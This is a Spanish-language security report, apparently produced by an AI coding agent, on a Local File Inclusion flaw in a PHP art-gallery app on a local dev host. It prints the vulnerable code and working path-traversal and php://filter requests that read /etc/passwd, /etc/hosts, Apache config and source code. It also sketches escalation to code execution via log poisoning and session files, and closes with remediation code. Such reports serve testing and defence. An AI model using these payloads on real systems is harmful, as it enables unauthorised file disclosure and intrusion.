# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-21T08:07:47  
**Objetivo:** http://web.dev.local:8081  
**Analista:** GitHub Copilot CLI (Claude Sonnet 4.6)  
**Clasificación:** CRÍTICO

---

## 1. Resumen Ejecutivo

Se ha identificado y explotado con éxito una vulnerabilidad de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" alojada en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de archivos del servidor sin autenticación.

---

## 2. Descripción de la Vulnerabilidad

### Tipo
- **CWE-98:** Improper Control of Filename for Include/Require Statement in PHP Program  
- **OWASP:** A01:2021 – Broken Access Control / A03:2021 – Injection

### Localización
- **URL vulnerable:** `http://web.dev.local:8081/gallery.php`
- **Parámetro afectado:** `page` (método GET)

### Código Vulnerable

```php
$page = $_GET['page'] ?? 'modern';

// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is 
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>...";
    // Try to include anyway
    @include($file);
}
```

**Causa raíz:** La lógica determina si el valor contiene un `.` para usarlo directamente como ruta de archivo sin ninguna validación ni sanitización. Esto permite a un atacante inyectar rutas de path traversal (`../../../etc/passwd`) que contienen puntos y son usadas sin restricción.

---

## 3. Prueba de Concepto (PoC)

### 3.1 Lectura de /etc/passwd

**Request:**
```
GET /gallery.php?page=../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081
```

**Resultado (extracto):**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 3.2 Lectura de /etc/hosts

**Request:**
```
GET /gallery.php?page=../../../etc/hosts HTTP/1.1
Host: web.dev.local:8081
```

**Resultado:**
```
127.0.0.1   localhost
::1         localhost ip6-localhost ip6-loopback
172.19.0.2  d5054e367753
```

### 3.3 Lectura de Código Fuente con php://filter

**Request:**
```
GET /gallery.php?page=php://filter/convert.base64-encode/resource=../../../var/www/html/gallery.php
```

**Resultado:** El código fuente completo del archivo `gallery.php` fue obtenido en base64 y decodificado, exponiendo la lógica de la aplicación.

### 3.4 Lectura de Configuración de Apache

**Request:**
```
GET /gallery.php?page=../../../etc/apache2/apache2.conf HTTP/1.1
```

**Resultado:** Configuración completa del servidor Apache2 expuesta.

---

## 4. Archivos Leídos Exitosamente

| Archivo | Estado | Información Obtenida |
|---------|--------|----------------------|
| `/etc/passwd` | ✅ Leído | Usuarios del sistema, rutas home, shells |
| `/etc/hosts` | ✅ Leído | IP interna: 172.19.0.2, hostname: d5054e367753 |
| `/etc/apache2/apache2.conf` | ✅ Leído | Configuración completa del servidor web |
| `/var/www/html/gallery.php` | ✅ Leído | Código fuente PHP completo |
| `/etc/shadow` | ❌ Denegado | Sin permisos (www-data) |
| `/proc/self/environ` | ❌ Denegado | Sin permisos |

---

## 5. Información Sensible Descubierta

- **Servidor:** Apache2 corriendo como `www-data` (UID 33)
- **Ruta web:** `/var/www/html/`
- **Contenedor Docker:** Hostname `d5054e367753`, IP interna `172.19.0.2`
- **Sistema operativo:** Linux (Debian-based, según rutas `/usr/sbin/nologin`)
- **PHP include_path:** `.:/usr/local/lib/php`
- **Usuarios del sistema:** root, daemon, bin, sys, www-data, nobody, _apt

---

## 6. Vectores de Ataque Adicionales

La vulnerabilidad LFI podría escalarse a **RCE (Remote Code Execution)** mediante:

1. **Log Poisoning:** Inyectar código PHP en logs de Apache y luego incluirlos via LFI
2. **php://input:** Si `allow_url_include` está habilitado (no confirmado)
3. **Session File Inclusion:** Incluir archivos de sesión PHP con código malicioso
4. **Upload + LFI:** Si existe algún punto de subida de archivos, combinar con LFI

---

## 7. Impacto

| Métrica | Valor |
|---------|-------|
| **CVSS v3 Score** | 9.1 (Crítico) |
| **Confidencialidad** | Alto - Lectura de archivos arbitrarios del sistema |
| **Integridad** | Medio - Potencial escalada a RCE |
| **Disponibilidad** | Medio - Potencial para causar errores en aplicación |
| **Autenticación requerida** | No |
| **Interacción del usuario** | No |

---

## 8. Recomendaciones

### Corrección Inmediata

1. **Whitelist de páginas permitidas:** Implementar una lista blanca de valores permitidos para el parámetro `page`:

```php
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
$page = $_GET['page'] ?? 'modern';

if (!in_array($page, $allowed_pages)) {
    $page = 'modern'; // valor por defecto
}

$file = "pages/" . $page . ".php";
```

2. **Eliminar la lógica de punto:** Nunca usar el valor del parámetro directamente como ruta de archivo.

3. **Deshabilitar wrappers PHP peligrosos:** En `php.ini`:
```ini
allow_url_include = Off
allow_url_fopen = Off
```

4. **Usar `realpath()` para validar rutas:**
```php
$base_dir = realpath(__DIR__ . '/pages/');
$file = realpath($base_dir . '/' . $page . '.php');
if (strpos($file, $base_dir) !== 0) {
    die('Acceso no autorizado');
}
```

### Medidas Adicionales

- Implementar WAF con reglas para detectar path traversal
- Reducir permisos del proceso web (principio de mínimo privilegio)
- Habilitar `open_basedir` en PHP para limitar el acceso al sistema de archivos
- Revisar logs de acceso para detectar intentos previos de explotación

---

## 9. Conclusión

La aplicación web "Galería de Arte Virtual" presenta una vulnerabilidad **crítica** de Local File Inclusion en el parámetro `page` de `gallery.php`. La falta de validación de la entrada del usuario permite leer cualquier archivo del sistema al que el proceso web tenga acceso. La explotación es trivial, no requiere autenticación y puede derivar en comprometer completamente el servidor. Se recomienda corrección **inmediata**.

---

*Informe generado el 2026-04-21T08:07:47 UTC*
